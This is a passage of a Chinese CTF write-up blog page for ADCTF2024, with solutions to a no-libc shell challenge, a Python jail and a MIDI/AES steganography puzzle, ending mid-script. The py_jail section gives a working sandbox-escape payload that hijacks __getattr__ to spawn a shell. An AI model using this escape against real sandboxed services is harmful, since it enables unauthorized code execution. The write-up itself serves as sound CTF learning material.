<!DOCTYPE html><html lang="zh-cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ADCTF2024 个人Writeup | GamerNoTitle</title><meta name="author" content="GamerNoTitle,admin@bili33.top"><meta name="copyright" content="GamerNoTitle"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="MISC[Easy] nolibc 坏了，刚刚不小心 把 libc 删掉了 ，输入什么都没用了，怎么办呜呜呜 T_T。 求求你惹，能不能帮我把一份重要文件 （指 flag） 拿出来，待会儿就要用惹xwx。  rkk是不是做了MoeCTF的那个题所以出了这个……   这题我直接把我MoeCTF的Payload拿过来用的，但是跟那个题目不一样的地方在于我们不知道flag在哪里，所以我先试试看看当前目录">
<meta property="og:type" content="article">
<meta property="og:title" content="ADCTF2024 个人Writeup">
<meta property="og:url" content="https://bili33.top/posts/ADCTF2024-Writeup/index.html">
<meta property="og:site_name" content="GamerNoTitle">
<meta property="og:description" content="MISC[Easy] nolibc 坏了，刚刚不小心 把 libc 删掉了 ，输入什么都没用了，怎么办呜呜呜 T_T。 求求你惹，能不能帮我把一份重要文件 （指 flag） 拿出来，待会儿就要用惹xwx。  rkk是不是做了MoeCTF的那个题所以出了这个……   这题我直接把我MoeCTF的Payload拿过来用的，但是跟那个题目不一样的地方在于我们不知道flag在哪里，所以我先试试看看当前目录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://assets.bili33.top/img/ADCTF2024-Writeup/msedge_5Mr1PCe98I.png">
<meta property="article:published_time" content="2024-12-07T06:28:01.000Z">
<meta property="article:modified_time" content="2026-02-18T14:32:18.984Z">
<meta property="article:author" content="GamerNoTitle">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="ADCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://assets.bili33.top/img/ADCTF2024-Writeup/msedge_5Mr1PCe98I.png"><link rel="shortcut icon" href="https://assets.bili33.top/img/AboutMe/logo-mini.png"><link rel="canonical" href="https://bili33.top/posts/ADCTF2024-Writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bili33.top/npm/@fortawesome/fontawesome-free@6.2.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.bili33.top/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.bili33.top/npm/@fancyapps/ui@4.0.31/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?1a9dfff1b560a523701cb01384373c75";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-138072700-2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-138072700-2');
</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;b259d35cad514e45a226d03906d8fed1&quot;}"></script><link rel="stylesheet" href="https://font.sec.miui.com/font/css?family=MiSans:400,500,700:Chinese_Simplify,Latin&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":180,"position":"top","messagePrev":"本文修改于","messageNext":"天前，如果本文有一定的时效性，那么本文可能已经失效~"},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"limitCount":200,"languages":{"author":"Author: GamerNoTitle","link":"Link: ","source":"Source: GamerNoTitle","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.bili33.top/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.bili33.top/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ADCTF2024 个人Writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2026-02-18 22:32:18'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3KdcwFGRWCpapHjZ",ck:"3KdcwFGRWCpapHjZ",autoTrack:true,hashMode:true,screenRecord:true})</script><meta name="referrer" content="no-referrer-when-downgrade" /><meta itemprop="name" content="GamerNoTitle"><meta itemprop="image" content="https://assets.bili33.top/img/AboutMe/logo-mini.png"><meta name="description" itemprop="description" content="欢迎来到GamerNoTitle的博客~"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/twikoo-height.css"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/BB.css"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/twikoo-emotion.css"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/Valine-Emotion.css"><script src="https://assets.bili33.top/js/IPblock.js"></script><script src='https://assets.bili33.top/js/console.js'></script><script src="https://cdn.bili33.top/npm/cardlink"></script><script src="//cdn.bili33.top/npm/matter-js@0.19.0"></script><script>(new Date().getDate() === 1 && new Date().getMonth() === 3) && document.write('<script src="https://cdn.bili33.top/gh/Vikutorika/newassets@master/js/smooth-April-Fools.js"><\/script>')</script><script src="https://npm.elemecdn.com/echarts@4.9.0/dist/echarts.min.js"></script><script src="https://npm.elemecdn.com/echarts@4.9.0/map/js/china.js"></script><script defer src="https://analytics.bili33.top/script.js" data-website-id="eb23a18b-6650-4776-8ded-29107aba832b"></script><script src="/js/solidity.js"></script><link rel="stylesheet" href="/css/solidity.css"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="http://assets.bili33.top/css/waline-style.css"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="GamerNoTitle" type="application/atom+xml">
</head><body><link rel="stylesheet" href="https://cdn.bili33.top/npm/gamernotitle-oss@1.0.10/css/barber-shop.css"/><script src="https://cdn.bili33.top/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/AboutMe/logo-mini.png" onerror="onerror=null;src='https://assets.bili33.top/img/link/Akarin.webp'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">140</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">188</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-gamepad"></i><span> Entertainment</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-image"></i><span> Gallery</span></a></li><li><a class="site-page child" href="/GenshinGacha/"><i class="fa-fw fa-solid fa-star-of-david"></i><span> GenshinGacha</span></a></li><li><a class="site-page child" href="/StarRailGacha/"><i class="fa-fw fa-solid fa-ticket"></i><span> StarRailGacha</span></a></li><li><a class="site-page child" href="/ArknightsGacha/"><i class="fa-fw fa-solid fa-gem"></i><span> ArknightsGacha</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i><span> Link</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Friends</span></a></li><li><a class="site-page child" href="/charts/"><i class="fa-fw fas fa-chart-pie"></i><span> Charts</span></a></li><li><a class="site-page child" href="https://moment.bili33.top/"><i class="fa-fw fa-solid fa-circle-nodes"></i><span> Moment</span></a></li><li><a class="site-page child" href="https://t.me/DohnaNyan"><i class="fa-fw fa-brands fa-telegram"></i><span> Telegram Group</span></a></li><li><a class="site-page child" href="https://t.me/PaffChannel"><i class="fa-fw fas fa-bullhorn"></i><span> Telegram Channel</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/About/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://assets.bili33.top/img/ADCTF2024-Writeup/msedge_5Mr1PCe98I.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">GamerNoTitle</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-gamepad"></i><span> Entertainment</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-image"></i><span> Gallery</span></a></li><li><a class="site-page child" href="/GenshinGacha/"><i class="fa-fw fa-solid fa-star-of-david"></i><span> GenshinGacha</span></a></li><li><a class="site-page child" href="/StarRailGacha/"><i class="fa-fw fa-solid fa-ticket"></i><span> StarRailGacha</span></a></li><li><a class="site-page child" href="/ArknightsGacha/"><i class="fa-fw fa-solid fa-gem"></i><span> ArknightsGacha</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i><span> Link</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Friends</span></a></li><li><a class="site-page child" href="/charts/"><i class="fa-fw fas fa-chart-pie"></i><span> Charts</span></a></li><li><a class="site-page child" href="https://moment.bili33.top/"><i class="fa-fw fa-solid fa-circle-nodes"></i><span> Moment</span></a></li><li><a class="site-page child" href="https://t.me/DohnaNyan"><i class="fa-fw fa-brands fa-telegram"></i><span> Telegram Group</span></a></li><li><a class="site-page child" href="https://t.me/PaffChannel"><i class="fa-fw fas fa-bullhorn"></i><span> Telegram Channel</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/About/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ADCTF2024 个人Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-07T06:28:01.000Z" title="Created 2024-12-07 14:28:01">2024-12-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-18T14:32:18.984Z" title="Updated 2026-02-18 22:32:18">2026-02-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">12.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>63min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ADCTF2024 个人Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Easy-nolibc"><a href="#Easy-nolibc" class="headerlink" title="[Easy] nolibc"></a><strong>[Easy]</strong> nolibc</h2><blockquote>
<p>坏了，刚刚不小心 <strong>把 libc 删掉了</strong> ，输入什么都没用了，怎么办呜呜呜 T_T。</p>
<p>求求你惹，能不能帮我把一份重要文件 <del>（指 flag）</del> 拿出来，待会儿就要用惹xwx。</p>
</blockquote>
<div class="note info flat"><p>rkk是不是做了MoeCTF的那个题所以出了这个……</p>
</div>

<p>这题我直接把我MoeCTF的Payload拿过来用的，但是跟那个题目不一样的地方在于我们不知道flag在哪里，所以我先试试看看当前目录的东西</p>
<p>当然，没有libc，我们是用不了<code>ls</code>的，所以我用了<code>echo *</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_JHoUEYeqBD.png"></p>
<p>得到flag的文件名为<code>4La9-83c566f8</code>，还是因为没有libc，所以没有<code>cat</code>，所以用<code>while</code>+<code>read</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span>; <span class="keyword">done</span> &lt; 4La9-83c566f8</span><br></pre></td></tr></table></figure>

<p>然后就得到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_dxaEXyzfNS.png"></p>
<h2 id="Easy-py-jail"><a href="#Easy-py-jail" class="headerlink" title="[Easy] py_jail"></a><strong>[Easy]</strong> py_jail</h2><p>连接题目得到源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    _ = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> _ == <span class="string">&#x27;EOF&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    code += _ + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line"><span class="keyword">assert</span> code.isascii()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">    <span class="keyword">assert</span> c <span class="keyword">not</span> <span class="keyword">in</span> code</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">exec</span>(code)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Exception!&#x27;</span>, <span class="built_in">str</span>(e))</span><br></pre></td></tr></table></figure>

<p>这里是把条件限定在了不能用小括号并且只能用ASCII字符，所以我们就不能用花体字（同字母但是非ASCII）来逃逸了</p>
<p>稍微搜了一下，发现可以用魔术方法，我先把我的payload放这里</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system <span class="keyword">as</span> __getattr__</span><br><span class="line"><span class="keyword">from</span> __main__ <span class="keyword">import</span> sh</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p><code>__getattr__</code>是Python自带的一个方法，当访问一个对象不存在的对象属性的时候就会被调用，在这里我们用<code>from os import system as __getattr__</code>提前把 <code>__getattr__</code>改成了<code>system</code>函数</p>
<p>接着，从<code>from __main__ import sh</code>，我们正在运行的程序会被Python认为是<code>__main__</code>模块，而<code>sh</code>是这个模块里面不存在的一个属性，所以<code>__getattr__</code>会被调用，而我们的属性名为<code>sh</code>，所以本来是<code>__getattr__(&quot;sh&quot;)</code>会被拼接成<code>system(&quot;sh&quot;)</code>，达到了获得shell的目的</p>
<p>接着就是读取flag了，这个就没啥好说的了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_Mc766bFySu.png"></p>
<h2 id="Easy-Black-MIDI-Bad-Apple"><a href="#Easy-Black-MIDI-Bad-Apple" class="headerlink" title="[Easy] [Black MIDI] Bad Apple!!"></a><strong>[Easy]</strong> [Black MIDI] Bad Apple!!</h2><blockquote>
<p>rk 最近想起了几年前看的 <em>黑乐谱</em> 视频，想着自己能不能也编出一套黑乐谱。</p>
<p>为了学习黑乐谱，于是开始学习使用 MIDI 编辑器，开始尝试的第一步。</p>
<p>你能不能找出来 rk 学习时在 MIDI 里夹带的私货？</p>
</blockquote>
<div class="note info flat"><p>Bad Apple &#x3D; BA &#x3D; Base + AES</p>
<p>QED.</p>
</div>

<p>把MIDI丢到Audacity看，逐个轨道观察，发现第13轨道有类似于摩斯电码的东西</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_6CT2ilsUtu.png"></p>
<p>转移出来得到<code>TOHOMUSICDAISUKI</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_SN4InZwDPf.png"></p>
<p>然后在rkk的助攻下，下了个专业（真的专业吗）的MIDI编辑器看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/QQ_xN7XPSZnBx.png"></p>
<p>发现第12轨道有名称<code>flag</code>，并且刚刚的13轨道名称为<code>key</code>，于是联想到AES加密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_2EHdBsL6pk.png"></p>
<p>在这编辑器里把其他轨道都删除，然后只保留12轨道，另存为文件，丢入010Editor，发现除了下图红框部分，下面的内容都可以每9个字节分为一组，并且有固定的格式<code>00 9C &#123;31&#125; 40 9E 00 8C &#123;31&#125; 00</code>，其中<code>&#123;31&#125;</code>处是可变的，猜测为音符对应的十六进制</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/010Editor_7R8uXD7Doz.png"></p>
<p>写个脚本提取出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_variable_numbers</span>(<span class="params">hex_file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(hex_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去除文件头和相关信息</span></span><br><span class="line">    data = data[<span class="number">49</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化提取的数字列表</span></span><br><span class="line">    variable_numbers = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 9个一组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data) - <span class="number">8</span>, <span class="number">9</span>):</span><br><span class="line">        group = data[i:i+<span class="number">9</span>]</span><br><span class="line">        <span class="built_in">print</span>(group)</span><br><span class="line">        <span class="comment"># 判断当前组是否符合格式</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(group) == <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">if</span> group[:<span class="number">2</span>] == <span class="string">b&#x27;\x00\x9C&#x27;</span> <span class="keyword">and</span> group[<span class="number">3</span>:<span class="number">5</span>] == <span class="string">b&#x27;\x40\x9E&#x27;</span> <span class="keyword">and</span> group[<span class="number">5</span>:<span class="number">6</span>] == <span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">and</span> group[<span class="number">6</span>:<span class="number">7</span>] == <span class="string">b&#x27;\x8C&#x27;</span> <span class="keyword">and</span> group[<span class="number">8</span>:<span class="number">9</span>] == <span class="string">b&#x27;\x00&#x27;</span>:</span><br><span class="line">                <span class="comment"># 提取出中间的数据部分</span></span><br><span class="line">                variable_numbers.append(group[<span class="number">2</span>:<span class="number">3</span>].<span class="built_in">hex</span>())</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 不符合格式则停止提取</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> variable_numbers</span><br><span class="line"></span><br><span class="line">hex_file_path = <span class="string">&#x27;flag.mid&#x27;</span>  <span class="comment"># 只有13轨道的MIDI文件</span></span><br><span class="line">numbers = extract_variable_numbers(hex_file_path)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Numbers: &quot;</span> + <span class="string">&quot; &quot;</span>.join(numbers))</span><br></pre></td></tr></table></figure>

<p>可以得到十六进制数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31 47 41 45 4e 43 75 6d 36 6d 79 54 39 44 4a 6e 31 4f 6e 65 2b 52 70 61 41 5a 50 50 2f 73 38 78 45 45 2f 69 53 46 34 79 75 2b 44 72 77 73 72 2b 54 68 59 4f 71 49 47 30 73 54 38 55 59 58 48 30 45 38 31 6b 6a 6d 67 31 44 42 53 49 55 41 38 32 33 79 33 74 51 32 55 58 4d 33 33 36 45 55 51 57 73 4b 62 61 65 73 71 70 58 54 4d 3d</span><br></pre></td></tr></table></figure>

<p>再来个AES解密脚本（注意这里密文的padding有问题），这里是猜测了向量跟密钥一样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">ciphertext_base64, key</span>):</span><br><span class="line">    ciphertext = base64.b64decode(ciphertext_base64)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将密钥转为字节</span></span><br><span class="line">    key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    iv = key_bytes[:AES.block_size]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化 AES 解密器</span></span><br><span class="line">    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解密失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        decrypted_data = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> decrypted_data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;解密失败&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ciphertext_base64 = <span 